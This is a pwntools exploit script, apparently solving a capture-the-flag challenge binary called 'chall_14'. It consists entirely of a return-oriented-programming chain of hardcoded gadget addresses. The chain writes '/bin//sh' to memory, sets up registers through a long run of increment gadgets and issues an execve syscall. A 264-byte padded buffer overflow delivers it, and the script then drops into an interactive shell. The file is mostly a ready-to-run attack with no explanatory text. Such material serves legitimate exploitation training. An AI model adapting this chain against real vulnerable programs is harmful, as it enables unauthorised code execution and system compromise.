from pwn import *
from struct import pack

# Padding goes here
p = b''

p += p64(0x000000000040f3fe) # pop rsi ; ret
p += p64(0x00000000004c00e0) # @ .data
p += p64(0x00000000004494a7) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040f3fe) # pop rsi ; ret
p += p64(0x00000000004c00e8) # @ .data + 8
p += p64(0x0000000000443b00) # xor rax, rax ; ret
p += p64(0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004018ca) # pop rdi ; ret
p += p64(0x00000000004c00e0) # @ .data
p += p64(0x000000000040f3fe) # pop rsi ; ret
p += p64(0x00000000004c00e8) # @ .data + 8
p += p64(0x00000000004017cf) # pop rdx ; ret
p += p64(0x00000000004c00e8) # @ .data + 8
p += p64(0x0000000000443b00) # xor rax, rax ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004709f0) # add rax, 1 ; ret
p += p64(0x00000000004012d3) # syscall

r = process("./chall_14")
payload = b's'*264+p
r.sendline(payload)
r.interactive()
